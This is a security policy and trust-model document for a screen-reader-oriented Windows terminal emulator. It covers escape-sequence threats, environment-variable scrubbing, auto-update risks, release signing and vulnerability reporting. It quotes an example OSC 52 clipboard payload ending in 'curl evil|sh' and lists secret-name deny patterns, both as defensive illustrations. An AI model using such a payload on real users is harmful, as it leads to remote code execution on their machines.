# Security policy and trust model

> [!WARNING]
> **Releases tagged before `v0.1.0` are unsigned previews.** They
> carry no Authenticode signature and no Ed25519 release-manifest
> signature. SmartScreen will warn on first install. **Do not use
> preview builds in production or on machines that handle sensitive
> data.** Authenticode (via SignPath OSS) and Ed25519 manifest pinning
> return before `v0.1.0`; the procedure is preserved in
> [`docs/RELEASE-PROCESS.md`](docs/RELEASE-PROCESS.md) under
> "Re-enabling signing (deferred)".

`pty-speak` is a terminal emulator. That means it routinely renders
attacker-influenced bytes (build logs, `git log` output, `npm install`
output, model responses) and forwards user keystrokes to a child
process. The threat surface is real and historically rich.

This document explains:

1. What we defend against.
2. What is explicitly out of scope.
3. How releases are signed and verified.
4. How to report a vulnerability.

## What we defend against

The terminal core will implement the mandatory mitigations below.
Each bullet is annotated with its implementation status as of
`main`. **For the consolidated audit-trail summary of every threat
class — including the auto-update threats added by Stage 11 and
the build / supply-chain threats from CI hardening — see the
"[Vulnerability inventory](#vulnerability-inventory)" section below.**
The list here is narrative-first; the inventory table is the index.

The list is the *target* trust model; track each via the
corresponding stage in [`spec/tech-plan.md`](spec/tech-plan.md).

- **No response-generating sequences.** *(planned, stage TBD as part of
  the Stage 2+ parser hardening pass.)* DSR (`CSI n`), DA1/DA2/DA3,
  DECRQM, DECRQSS, cursor-position report, title report (`CSI 21 t`),
  and font-size reports will be parsed and **dropped**. Background:
  CVE-2003-0063, CVE-2022-45872, CVE-2024-50349/52005.
- **No clipboard write from the child.** *(planned, parser-hardening
  pass.)* OSC 52 set-selection will be ignored. A child writing
  `\x1b]52;c;<base64 with newline>curl evil|sh\x07` must not be one
  paste away from RCE.
- **OSC 0/2 window title sanitisation.** *(planned, parser-hardening
  pass.)* Control characters and embedded escapes will be stripped
  before any UIA exposure or window title set; titles truncated to 256
  bytes. Background: CVE-2022-44702.
- **OSC 8 hyperlink scheme allowlist.** *(planned alongside the OSC 8
  UIA Hyperlink-pattern surface, Stage 4+.)* Only `http`, `https`, and
  `file` schemes will be exposed; `javascript:`, `data:`, custom URI
  schemes dropped silently.
- **Logging chokepoint.** *(shipped, Logging-PR.)* pty-speak
  writes structured logs to
  `%LOCALAPPDATA%\PtySpeak\logs\pty-speak-{date}.log` for
  diagnostic visibility into intermittent bugs (ConPTY
  spawn failures, Coalescer exceptions, etc.). The log call-site
  discipline NEVER logs **typed user input**, **paste content**,
  **full screen contents**, **environment variables** (parent
  process env may contain `GITHUB_TOKEN`, `OPENAI_API_KEY`, etc.
  — Stage 7's env-scrub work handles the parent-to-child
  filtering, sequenced as Part 2 of
  [`docs/PROJECT-PLAN-2026-05.md`](docs/PROJECT-PLAN-2026-05.md);
  logs enforce the same discipline at the file boundary). PRs
  that add log calls MUST honour this list;
  reviewers reject log sites that risk leaking these categories.
  Full description in [`docs/LOGGING.md`](docs/LOGGING.md).
- **Bracketed-paste injection defence.** *(shipped, Stage 6 PR-B.)*
  When the user pastes clipboard content into pty-speak, the
  `KeyEncoding.encodePaste` chokepoint strips embedded `\x1b[201~`
  byte sequences from the clipboard text **before** wrapping in
  `\x1b[200~` ... `\x1b[201~`. xterm and Windows Terminal don't strip
  — but for screen-reader users who can't easily inspect their
  clipboard before pasting, an attacker-crafted paste containing
  `\x1b[201~` followed by a malicious shell command would otherwise
  close the bracket-paste frame early and execute the post-paste
  portion as if typed (out-of-band shell injection via clipboard).
  Defence-in-depth: stripping happens even when DECSET ?2004 is
  clear, since no legitimate shell content contains that exact
  byte sequence and the cost of stripping is essentially zero.
  Deliberate accessibility-first posture divergence from xterm's
  permissive default.
- **Control-character stripping in `displayString`.** *(planned with
  Stage 5 streaming notifications.)* Everything passed to
  `UiaRaiseNotificationEvent` will have C0 / C1 / DEL stripped first.
- **Output rate limiting.** *(planned with Stage 5.)* Output ingestion
  capped at ~10 MB/s to defeat ANSI-bomb DoS targeting the screen
  reader rather than the CPU.
- **Process isolation.** *(partial, Stage 1.)* Pipe handles are not
  inherited (`bInheritHandles = FALSE`); ConPTY duplicates them via
  the attribute list — implemented today. **Job Object lifecycle
  (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) was deferred from Stage 1**;
  see [`docs/CONPTY-NOTES.md`](docs/CONPTY-NOTES.md). The "we never
  run elevated with an unelevated child" guarantee is also future
  work; until enforced in code, do not run pty-speak elevated.
- **Keyboard input contract.** *(shipped, Stage 6.)*
  `TerminalView.OnPreviewKeyDown` translates WPF
  `Key + ModifierKeys` into the platform-neutral
  `KeyCode + KeyModifiers` then routes through the pure-F#
  `KeyEncoding.encode` chokepoint, which produces xterm-style VT
  byte sequences (DECCKM-aware arrows, SGR-modifier protocol for
  modified cursor / function keys, Ctrl-letter folding, Alt-prefix
  for ESC-modifier). Filter ordering is load-bearing and pinned
  by inline doc-comment + the test suite: (1) `AppReservedHotkeys`
  short-circuits first so app-level hotkeys (Ctrl+Shift+U / D / R
  shipped, Ctrl+Shift+M and Alt+Shift+R future-reserved) reach
  the parent window's `InputBindings` without forwarding to the
  PTY; (2) the screen-reader-modifier filter (bare Insert /
  CapsLock + Numpad-with-NumLock-off) returns without `Handled`
  so NVDA / JAWS / Narrator review-cursor keys keep working; (3)
  printable typing without Ctrl/Alt defers to
  `OnPreviewTextInput` for IME / AltGr / dead-key correctness.
  Job Object containment with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`
  guarantees the entire child-process tree dies when pty-speak
  exits — even on a hard parent crash that doesn't run
  `IDisposable`. Closes audit-inventory row A-3.

The full mitigation matrix will live in `Terminal.Parser` and be
covered by parser-level unit tests. PRs that disable any of the above
must justify the change in the PR description and update this document.

## Out of scope

We do not defend against:

- A user pasting an arbitrary command and pressing Enter. Bracketed
  paste warns the child a paste is happening; it does not block it.
- A compromised developer machine with both the signing-key share and
  a checked-out clone. Our trust root is a private key; if it is
  stolen we revoke and reissue.
- Side-channel attacks on the host system.
- Vulnerabilities in third-party child processes (Claude Code, npm,
  pip, etc.). Once Job Object isolation lands we cap their lifetime
  to the parent's; we never audit their code.

## Auto-update threat model

Stage 11 (Velopack auto-update via `Ctrl+Shift+U`, shipped in PR #63
and refined in PR #66) introduces a network-fetch + execute path
that is now part of the running app's behaviour. This section
enumerates the threats against that path, the protections in place
**today** on the unsigned-preview line, and the protections that
return at `v0.1.0` when signing comes back.

The chain of trust looks like this — each link's failure has a
distinct mitigation:

```
Maintainer's GitHub account
        │
        ▼  (publishes a release tag pointing at a commit)
Git tag on GitHub
        │
        ▼  (release: published event fires)
release.yml on a windows-latest runner
        │
        ▼  (vpk pack produces nupkg + Setup.exe + releases.win.json)
GitHub Release assets
        │
        ▼  (HTTPS over TLS to api.github.com / objects.githubusercontent.com)
Velopack on the user's machine
        │
        ▼  (hash-verify nupkg against releases.win.json, then apply)
Updated install in %LocalAppData%\pty-speak\
```

Threats are organised by which link of the chain they target.

### T-1. Network attacker observes the update flow (passive)

**Risk:** A passive eavesdropper can see when the user updates, what
version transitions occur, and (via traffic timing / size) infer
which release they're on.

**Severity:** Low. The update flow contacts public GitHub Release
endpoints; release versions are themselves public. No user secrets
are transmitted.

**Mitigation today:** TLS to GitHub. SNI is not encrypted, so an
observer can see the destination is `github.com` / its CDN, but the
specific URL path and response body are encrypted.

**Future mitigation:** None planned; the cost-benefit of ECH
(Encrypted Client Hello) for this app is not justified.

### T-2. Network attacker substitutes update bytes (active MITM)

**Risk:** An attacker on the network path between the user and
GitHub injects a malicious `*-full.nupkg` or `*-delta.nupkg`
substitute for the legitimate one. If accepted, the next
`ApplyUpdatesAndRestart` runs attacker-controlled code at the
user's privilege level.

**Severity:** High if it lands; difficult to land.

**Mitigation today:**

- TLS prevents the simple-MITM case — the attacker would need to
  defeat the certificate chain (compromise a CA, exploit a CT-log
  gap, or be the user's network operator with a trusted-root MITM
  proxy installed).
- Velopack writes a SHA hash for every `*.nupkg` into
  `releases.win.json` at pack time. Before applying, Velopack
  verifies the downloaded bytes against that hash. A truncated,
  corrupted, or substituted nupkg fails verification and the apply
  step throws — caught by PR #66's `IOException` branch with the
  "Update could not be written to disk" announcement; the existing
  install is untouched.
- **Caveat:** if the attacker can substitute *both* `releases.win.json`
  AND the nupkg (consistent forgery), the hash check passes because
  they control both halves. This is the gap Ed25519 manifest signing
  closes.

**Future mitigation (`v0.1.0`+):** Ed25519 release-manifest signing
makes consistent forgery require the maintainer's offline private
key. See "Release signing and verification" below.

### T-3. Maintainer GitHub account compromise

**Risk:** An attacker who obtains the maintainer's GitHub credentials
(or an OAuth token with `repo` scope) publishes a malicious release
through the legitimate publishing flow. The release.yml workflow runs
attacker-controlled source if the attacker also pushes a malicious
PR to `main` and merges it; or, more simply, the attacker pushes a
new tag pointing at a malicious commit they've crafted.

**Severity:** Critical. Every running pty-speak that presses
`Ctrl+Shift+U` after the malicious release goes live would install
attacker-controlled code.

**Mitigation today:**

- **Branch protection on `main`** — direct pushes blocked; merges
  require PR review (status set in GitHub repository settings;
  honoured by CodeOwners and the `target_commitish=main` gate in
  `release.yml`). An attacker with stolen credentials still has to
  win a code review, OR find a way to bypass branch protection
  (which would itself be a noteworthy event).
- **2FA on the maintainer GitHub account.** Required by GitHub for
  the `kylekeane` account.
- **Repository visibility audit.** The release workflow's
  `target_commitish` gate fails fast if a release was published
  against a non-`main` branch (added in PR #44 after preview.14 was
  burned this way). An attacker pushing a malicious tag against a
  hidden branch is detected at workflow time.

**Future mitigation (`v0.1.0`+):** Ed25519 manifest signing. The
private key lives offline (never on the maintainer's GitHub-connected
machine, never on a CI runner). An attacker with credentials can
publish a release but cannot sign the manifest; the running app
rejects the unsigned manifest. This is the **central reason
signing returns before `v0.1.0`** — the unsigned-preview line's
trust root is the maintainer's GitHub account, which is a single
point of failure.

### T-4. CI runner compromise / supply-chain attack

**Risk:** A malicious dependency (npm / NuGet / GitHub Action)
modifies the build during `release.yml` execution to insert a
backdoor into the produced binaries. The legitimate release flow
runs to completion and the maliciously-modified `Setup.exe` ships.

**Severity:** Critical if it lands; the surface is broad
(`actions/checkout`, `actions/setup-dotnet`, `softprops/action-gh-release`,
NuGet packages including `Velopack` itself, etc.).

**Mitigation today:**

- **All third-party GitHub Actions pinned to major version tags**
  (`@v4`, `@v5`). This catches some classes of action-takeover
  attacks but not all; we trust the publishers
  (`actions/*` is GitHub-controlled, `softprops/*` is widely
  audited, `raven-actions/actionlint` runs only against our YAML
  not our code).
- **`actionlint` job in `ci.yml`** catches malicious YAML / shell
  injection via `${{ github.event.* }}` interpolation in `run:`
  blocks before merge.
- **Deterministic build flags** (`Deterministic=true`,
  `ContinuousIntegrationBuild=true` under `GITHUB_ACTIONS`) make
  the produced binaries hash-stable across runs, so anyone can
  rebuild from source per [`docs/BUILD.md`](docs/BUILD.md) and
  compare hashes against a published release.

**Future mitigation (`v0.1.0`+):** Authenticode signing happens
**off-runner** via SignPath Foundation OSS. The signing key never
touches the GitHub Actions runner; SignPath signs the artifact in
their own infrastructure after the runner uploads it. A
compromised runner can produce malicious bytes but cannot sign
them — Authenticode verification on the user side catches this.
The Ed25519 manifest signing has the same off-runner property.

### T-5. Replay / downgrade attack

**Risk:** An attacker presents an older legitimate release as
"current," tricking the running app into "updating" to a known-
vulnerable past version.

**Severity:** Medium. Each `0.0.x-preview.N` shipped knowingly with
the unsigned-preview caveat; downgrade does not increase the attack
surface because the "current" install carries the same caveat. Once
signing is on, downgrading from a signed `v0.1.0+` release to an
older signed release is the actual risk.

**Mitigation today:**

- Velopack's update flow only applies a release if its version is
  **strictly greater** than the installed version (SemVer
  comparison). An attacker pointing a downgrade at us is rejected
  by Velopack itself; we don't need to add a check.
- The `releases.win.json` manifest contains the full version list
  for the channel, not just the latest. A truncated manifest that
  hides newer releases would land users on the highest version
  the manifest exposes — same as today's behaviour, no security
  regression.

**Future mitigation:** None additional planned. Once Ed25519
signing is on, the manifest signature pins the version list
contents; an attacker cannot truncate it without breaking the
signature.

### T-6. Local privilege escalation via update path

**Risk:** A local non-admin attacker on the user's machine
manipulates the update flow to gain elevated privileges.

**Severity:** Low. The update flow runs at the user's existing
privilege level (per Velopack's `asInvoker` manifest requirement,
documented in `spec/tech-plan.md` §11.5). A local attacker who can
already write to `%LocalAppData%\pty-speak\` can simply replace
`Terminal.App.exe` directly, no update needed; no LPE is gained
through the update channel specifically.

**Mitigation today:** `asInvoker` manifest, per-user install path.

**Future mitigation:** None additional planned. Per-machine installs
(if we ever support them) would need their own threat analysis.

### T-7. Time-of-check vs time-of-use during apply

**Risk:** Between Velopack's hash verification and the apply step,
a local attacker swaps the verified file for a malicious one. The
attacker would need to be a local-non-admin process running
concurrently with the update flow.

**Severity:** Low (requires concurrent local malicious process —
which already has alternative attack paths via T-6).

**Mitigation today:** Velopack downloads to a temp directory,
verifies, then moves to the install location. The race window is
tight; local attackers pose a more severe threat through other
paths (T-6) without going through this race.

**Future mitigation:** Atomic replace via filesystem-level operations
is Velopack's responsibility; we inherit their current implementation.

### T-8. Resource exhaustion / DoS during update

**Risk:** An attacker forces the update flow to consume excessive
disk / network / CPU.

**Severity:** Low. The user must press `Ctrl+Shift+U` to trigger
the flow; an attacker cannot force the flow remotely. Repeated
keypresses are deduplicated by `updateInProgress` (PR #63). A
malformed release that's gigabytes in size would eventually hit
disk-full, caught by PR #66's `IOException` branch.

**Mitigation today:** In-flight dedup; structured failure
announcement.

**Future mitigation:** Not prioritised; severity is bounded by the
fact that update is user-initiated.

### T-9. Information disclosure via update logs

**Risk:** Velopack writes update logs (e.g. `Velopack.log` in the
install directory) that may contain user-identifying paths or
network endpoints. If the user shares the install directory with
an attacker, those logs are exposed.

**Severity:** Low. Logs do not contain credentials. Path leakage is
a privacy concern, not a security vulnerability.

**Mitigation today:** None specific.

**Future mitigation:** Could rotate / cap log size if it becomes a
concern.

### T-10. Mark-of-the-Web stripped by `install-latest-preview.ps1`

**Risk:** `scripts/install-latest-preview.ps1` calls `Unblock-File`
on the Velopack `Setup.exe` immediately after download to suppress
SmartScreen's first-run warning. This strips the Zone.Identifier
NTFS alternate data stream that marks the file as "from the
internet." A user running the script implicitly trusts that the
binary they're about to execute is the legitimate maintainer-built
release; SmartScreen's reputation check is bypassed by design.

**Severity:** Medium. The script is opt-in and lives in `scripts/`
under guidance documented in [`scripts/README.md`](scripts/README.md);
the in-app `Ctrl+Shift+U` flow (Stage 11) is the canonical update
path and does NOT call `Unblock-File`. The risk is concentrated on
the dev-iteration audience the script targets.

**Mitigation today:** The script is a **knowingly-accepted
operational mitigation**: it exists because the unsigned-preview
line has no Authenticode signature, and SmartScreen warns on every
download. Without `Unblock-File` the script would require the user
to right-click → Properties → Unblock for each release, which is
prohibitive for the iteration workflow the script supports. The
trust root is the same as for T-3 (the maintainer's GitHub
account); a compromised release would deliver malicious bytes
through both the script AND the in-app update path.

**Future mitigation (`v0.1.0`+):** Authenticode signing returns
SmartScreen reputation, so `Unblock-File` becomes unnecessary.
The script can drop the call once signing lands; track this in
the row D-1 in the inventory.

### Out of scope for the update path

We do not defend against:

- A user-modified install directory. If you replace `Terminal.App.exe`
  with a malicious binary at `%LocalAppData%\pty-speak\current\`,
  pressing `Ctrl+Shift+U` from that binary will run whatever code
  the attacker placed there. The trust root is the install,
  not the update flow.
- Compromise of Velopack itself (their delivery infrastructure /
  their NuGet package). We pin Velopack to a specific NuGet
  version, but a malicious `Velopack` package release would
  affect us until we noticed and pinned away from it. Velopack is
  widely used and audited (`Velopack/Velopack` on GitHub) — we
  inherit the broader ecosystem's scrutiny.
- A user who has chosen to disable Windows Update / antivirus and
  install with SmartScreen overridden. Self-elected trust
  reductions are out of scope.
- **Burned-tag visibility** (D-2). Releases that were tagged then
  walked back during the preview line (`preview.{14, 16, 17, 23,
  24}`) are still visible in the public release history. Velopack's
  version-comparison rejects downgrade attempts and `release.yml`'s
  walk-back logic skips these tags when computing delta sources, so
  the visibility is an operational-confusion risk rather than a
  security one. Cleaning up the public history would require
  rewriting Git history, which has its own trust-root cost; we
  accept the cosmetic drift.

## Release signing and verification

> The two layers below describe the **target** trust model from
> `v0.1.0` onward. Preview releases (`-preview.N`) are not yet signed;
> see the warning at the top of this document.

Every published `v0.1.0`+ release is signed in two layers:

1. **Authenticode** via the
   [SignPath Foundation OSS programme](https://signpath.org/) (free for
   active OSS projects). SmartScreen reputation accrues organically;
   per Microsoft's March 2024 changes, EV no longer grants instant
   reputation, so we treat the OSS-tier cert as sufficient.
2. **Ed25519 manifest pin.** The release manifest
   (`releases.json` produced by Velopack) is signed by an offline
   key. The application loads the public key from a code-frozen
   constant and rejects any update whose manifest signature does not
   verify, even if Authenticode passes. This is defense in depth
   against a compromised GitHub release without a stolen private key.

The public Ed25519 key will be published as `docs/release-pubkey.txt`
(it will be added to the repository as part of the one-time release
setup, see [`docs/RELEASE-PROCESS.md`](docs/RELEASE-PROCESS.md)) and
in the release notes of every signed release. If the key needs to be
rotated we will issue an explicit out-of-band advisory.

To verify a release manually:

```powershell
# Authenticode
Get-AuthenticodeSignature .\pty-speak-Setup.exe |
  Select-Object Status, SignerCertificate

# Ed25519 manifest (once manifest tooling lands; see docs/RELEASE-PROCESS.md)
pty-speak-verify --manifest releases.json --pubkey docs/release-pubkey.txt
```

## Vulnerability inventory

This is the consolidated index of every threat class this document
identifies, with the protections in place today and what closes
remaining gaps. Read this together with the narrative sections
above; the table is the audit-trail summary, the narrative is where
the rationale lives.

Row IDs are prefixed by surface: `TC-` covers terminal core (parser
+ screen), `PO-` covers process / OS isolation, `A-` covers
application/runtime surfaces (UIA peer, accessibility, in-app
keyboard contract), `T-` covers the auto-update threat model, `B-`
covers build and CI surfaces, `D-` covers developer-tooling and
operational mitigations, and `C-` covers configuration items
deferred to a later phase. The audit-cycle SR-1..SR-3 work
(November-December 2025) added the `A-`, `D-`, and `C-` prefixes
when those surfaces became code-bearing.

| ID | Threat class | Severity | Mitigated today by | Closed at v0.1.0+ by | Status |
|----|--------------|----------|--------------------|----------------------|--------|
| **Terminal core** ||||||
| TC-1 | Response-generating sequences (DSR, DA1/2/3, DECRQM, DECRQSS, cursor / title / font reports) | High (RCE class — see CVE-2003-0063, CVE-2022-45872, CVE-2024-50349/52005) | Catch-all drop in `Screen.csiDispatch` documented as security-critical (audit-cycle SR-1, PR #76); explicit handlers still pending Stage 2+ parser hardening pass | n/a (parser-level, not signing-related) | **partial** (drop intent documented; explicit drop handlers still planned) |
| TC-2 | OSC 52 clipboard write from child | High (one-paste-from-RCE class) | `Screen.Apply`'s `OscDispatch` arm silently drops every OSC dispatch with a SECURITY-CRITICAL long-form comment naming OSC 52 specifically (Stage 4a PR-A, formerly informally "Stage 4.5 PR-A"); parser-hardening pass for the catch-all-arm fills (response-generating sequences, etc.) is shipped via SR-1 + Stage 4a PR-A | n/a | **partial** (silent drop in place; never forwards OSC 52 bytes anywhere — re-enabling requires SECURITY.md update + security-test row per the comment block) |
| TC-3 | OSC 0/2 window title escape injection (CVE-2022-44702) | Medium | Not yet — parser hardening pass | n/a | **planned** |
| TC-4 | OSC 8 hyperlink with non-allowlisted scheme (`javascript:`, `data:`, etc.) | Medium | Not yet — Stage 4+ when OSC 8 surface lands | n/a | **planned** |
| TC-5 | Control characters in NVDA `displayString` | Low (defense in depth) | `Terminal.Core.AnnounceSanitiser.sanitise` strips C0/DEL/C1 from every announcement-bound exception message (audit-cycle SR-2, PR #77); Stage 5 Coalescer pipes every per-row announcement through the same `AnnounceSanitiser.sanitise` chokepoint (`src/Terminal.Core/Coalescer.fs:178`), closing the streaming-notification path. | n/a | **shipped** (both exception-message and streaming-notification paths sanitised) |
| TC-6 | Output-rate ANSI bomb DoS | Medium | Parser-state caps prevent unbounded accumulation: `MAX_PARAM_VALUE = 65535` clamp on CSI/DCS digit accumulators, `MAX_DCS_RAW = 4096` cap on DCS payload emission, `OscIgnore` overflow state on OSC payload past `MAX_OSC_RAW = 1024` (audit-cycle SR-1, PR #76); Stage 5 will add the ingestion-rate cap (~10 MB/s) | n/a | **partial** (parser-state ANSI-bomb closed; ingestion-rate cap planned for Stage 5) |
| **Process / OS** ||||||
| PO-1 | Pipe handle inheritance to child (allowing child to write back into our pipes) | High | `bInheritHandles=FALSE`; ConPTY duplicates via attribute list (Stage 1, **shipped**) | n/a | **shipped** |
| PO-2 | Orphan child process after parent exit | Medium (resource / accountability) | Not yet — Job Object lifecycle deferred from Stage 1 | n/a | **planned** |
| PO-3 | Child running with elevated privileges relative to parent | High (privilege confusion) | Not yet — "we never run elevated with unelevated child" planned | n/a | **planned** |
| PO-4 | Per-user install elevation (UAC) on update | Low | `asInvoker` manifest (Stage 11, **shipped**) | n/a | **shipped** |
| PO-5 | ConPTY child inherits parent process environment block | Medium (env-var leak: `GITHUB_TOKEN`, `OPENAI_API_KEY`, etc., reach the child shell) | **`Terminal.Pty.Native.EnvBlock`** (Stage 7 PR-A; allow-list expanded in PR-K) builds an explicit `lpEnvironment` block before every `CreateProcess` call. **Two-layer allow-list** per `spec/tech-plan.md` §7.2: layer 1 preserves `PATH`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`, `HOME` (with `%USERPROFILE%` fallback), `ANTHROPIC_API_KEY`, `CLAUDE_CODE_GIT_BASH_PATH`; layer 2 (PR-K, 2026-05-03 maintainer authorisation after empirical NVDA pass surfaced PowerShell + claude.exe dying on spawn) preserves the standard Windows runtime baseline `SystemRoot`, `WINDIR`, `SystemDrive`, `TEMP`, `TMP`, `ProgramFiles`, `ProgramFiles(x86)`, `ProgramW6432`, `ProgramData`, `ALLUSERSPROFILE`, `PUBLIC`, `PATHEXT`, `PSModulePath`, `COMPUTERNAME`, `USERNAME`, `USERDOMAIN`, `USERDOMAIN_ROAMINGPROFILE`, `PROCESSOR_*` (4 vars), `NUMBER_OF_PROCESSORS`, `OS`, `LOGONSERVER`, `SESSIONNAME`, `HOMEDRIVE`, `HOMEPATH`, `DriverData` — public machine identity / paths readable from registry by any unprivileged process. Always-set `TERM=xterm-256color` + `COLORTERM=truecolor` overrides any parent value; **deny-list overrides allow-list** for variables matching `*_TOKEN`, `*_SECRET`, `*_KEY` (with explicit `ANTHROPIC_API_KEY` exemption), `*_PASSWORD` (suffix match — `KEYBOARD_LAYOUT` is preserved). Marshalled UTF-16LE with `CREATE_UNICODE_ENVIRONMENT`, sorted by uppercase name per Win32 convention. Per-spawn log line `"Env-scrub: kept K of M parent vars; dropped D as sensitive (deny-list)"` at `Information` level (counts only, never names or values — env-var names like `BANK_API_KEY` are themselves sensitive per the logging-discipline contract). PR-K replaced the prior `"stripped {Count}"` line, which only reported deny-list strikes and obscured silent allow-list drops. Pinned by `tests/Tests.Unit/EnvBlockTests.fs` (allow-list preservation incl. Windows-baseline names, deny-list pattern matching, case-insensitivity, ANTHROPIC_API_KEY exemption, HOME fallback, byte-level marshalling round-trip — the silent-failure canary, ParentCount/KeptCount semantics). | n/a | **shipped** (Stage 7 PR-A; allow-list expanded PR-K) |
| **Application surfaces** ||||||
| A-1 | Jagged-snapshot `IndexOutOfRangeException` in word-boundary helpers | Medium (DoS in the screen-reader read path; today's `Screen.SnapshotRows` returns uniform rows, but `TerminalTextRange` constructor doesn't enforce uniformity) | `c >= rows.[r].Length` guards added inside `WordEndFrom`, `NextWordStart`, `PrevWordStart` in `TerminalAutomationPeer.fs` (audit-cycle SR-2, PR #77) | n/a | **shipped** |
| A-2 | `Move(Character, count)` int32 underflow when `count = int.MinValue` | Medium (wrong-direction range mutation slips past the `max 0` clamp via wraparound) | `int64` widening before the `curIdx + count` add, applied to both `Move` and `MoveEndpointByUnit` Character arms (audit-cycle SR-2, PR #77) | n/a | **shipped** |
| A-3 | Keyboard contract: `OnPreviewKeyDown` translates → `KeyEncoding.encode` → PTY write, with screen-reader-modifier filter and load-bearing filter ordering (AppReservedHotkeys first → screen-reader filter → translate → defer printable typing → encode + write). Job Object lifecycle (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) contains the child-process tree even on hard parent crash. | Low (filter ordering pinned by xUnit + behavioural tests; encoder is pure F# with ~35-fact test coverage; KILL_ON_JOB_CLOSE is kernel-enforced) | Stage 6 PR-A (parser arms) + PR-B (KeyEncoding module + WPF wiring + ResizePseudoConsole + Job Object); ongoing manual NVDA verification per the post-Stage-6 preview cycle. | n/a | **shipped (Stage 6)** |
| **Update path (Stage 11)** ||||||
| T-1 | Passive network observer of update flow | Low | TLS to GitHub | n/a (cost not justified) | **shipped** |
| T-2 | Active MITM substituting update bytes | High | TLS + Velopack per-nupkg SHA hash in releases.win.json | + Ed25519 manifest signing (consistent forgery resistance) | **partial** (TLS+hash today; signing v0.1.0+) |
| T-3 | Maintainer GitHub account compromise | Critical | `main` branch protection + 2FA + target-branch gate in release.yml | + Ed25519 manifest signing (key offline, never on GitHub) | **partial** (procedural today; cryptographic v0.1.0+) |
| T-4 | CI runner / supply-chain compromise | Critical | Pinned action versions + actionlint + deterministic build for hash comparison | + Authenticode signing happens off-runner via SignPath | **partial** |
| T-5 | Replay / downgrade attack | Medium | Velopack version-comparison; only applies strictly-greater versions | + Ed25519 manifest signing pins version list | **partial** |
| T-6 | LPE via update path | Low | `asInvoker` manifest, per-user install | n/a (LPE has alternative paths anyway) | **shipped** |
| T-7 | Time-of-check vs time-of-use during apply | Low | Velopack's atomic-ish stage-then-move | n/a | **shipped (inherited from Velopack)** |
| T-8 | Resource exhaustion on update | Low | User-initiated only; in-flight dedup; structured failure handling | n/a | **shipped** |
| T-9 | Velopack log path/info disclosure | Low | None specific | n/a | **accepted risk** |
| T-10 | `Unblock-File` MOTW strip in `install-latest-preview.ps1` | Medium | Knowingly-accepted operational mitigation; trust root is the same as T-3 (maintainer GitHub account); cross-link to D-1 | + Authenticode signing returns SmartScreen reputation; `Unblock-File` becomes unnecessary and the script can drop the call | **accepted risk** |
| **Build and supply chain** ||||||
| B-1 | Stale-branch release publishing (preview.{14, 23, 24} pattern) | Medium (operational) | Workflow target-branch gate + RELEASE-PROCESS.md hardened guidance + walk-back logic for burned-tag delta source (PRs #44, #64, #65) | n/a | **shipped** |
| B-2 | CHANGELOG / version mismatch on release | Low (operational) | Workflow extracts version from tag; CHANGELOG `[Unreleased]` rewrite step (PR #37) | n/a | **shipped** |
| B-3 | Velopack pack producing incomplete artifact set | Medium (silent ship of broken installer) | Defense-in-depth artifact-existence gate after vpk pack (PR #41) | n/a | **shipped** |
| B-4 | Malicious / unreviewed merge to `main` | Critical | Branch protection requires PR + review | + (organisational policy) at v0.1.0+ | **partial** |
| D-1 | `scripts/install-latest-preview.ps1` strips Mark-of-the-Web via `Unblock-File` | Medium | Knowingly-accepted operational mitigation: avoids per-release SmartScreen warnings during the unsigned-preview line. Trust root shared with T-3 (maintainer GitHub account). Deprecates once Stage 11's in-app `Ctrl+Shift+U` is the canonical update path AND signing returns at `v0.1.0+`. See narrative under T-10 | + Signing returns and `Unblock-File` becomes unnecessary | **accepted risk** |
| D-2 | Burned-tag releases visible in public history (`preview.{14, 16, 17, 23, 24}`) | Low | Velopack's version-comparison rejects downgrades; `release.yml`'s walk-back logic skips them when computing delta sources. Public visibility is an operational-confusion risk, not a security risk | n/a | **accepted risk** |
| **Configuration** ||||||
| C-1 | Hardcoded `UpdateRepoUrl` in `src/Terminal.App/Program.fs` | Low (restricts forks / self-hosting) | None — by design today; Phase 2's Tomlyn config substrate will expose this. Making it user-configurable introduces a new attack surface (untrusted TOML input) which the future config-loader contributor must threat-model | n/a | **deferred to Phase 2** |

### Severity glossary

- **Critical** — direct path to RCE on user machines or full
  compromise of the release distribution.
- **High** — meaningful step toward compromise (one mitigation
  away from Critical) or known CVE-class issue.
- **Medium** — exploit requires preconditions / chained vulnerabilities.
- **Low** — privacy / availability concerns; not direct security.

### Status glossary

- **shipped** — protection is implemented in `main` today.
- **partial** — some protection in place; full protection requires
  additional work (typically signing).
- **planned** — known and on the roadmap; not yet implemented.
- **accepted risk** — known but explicitly out of scope.

### How to use this inventory

When considering a change to `pty-speak` (a new feature, a
refactor, a dependency bump), check whether it touches any of
these classes. If a change weakens a protection, the PR description
must justify the change and update both the affected row in this
table and the relevant narrative section above. **PRs that disable
any protection without updating SECURITY.md should be requested
changes during review.**

## Reporting a vulnerability

**Do not** open a public GitHub issue for an unpatched security bug.

Use [GitHub private vulnerability reporting](https://github.com/KyleKeane/pty-speak/security/advisories/new)
for this repository. We commit to:

- Acknowledge within **3 business days**.
- Provide a status update or fix plan within **10 business days**.
- Credit reporters in the release notes (or anonymously on request).

For matters that are too sensitive for GitHub (e.g. an issue with the
signing infrastructure itself), email the maintainer listed on the
GitHub profile of the repository owner.

## Coordinated disclosure

We follow a 90-day disclosure window from the date we acknowledge the
report, with extensions negotiated on a case-by-case basis. Public
advisories are filed as
[GitHub Security Advisories](../../security/advisories) and
cross-posted to the release notes.
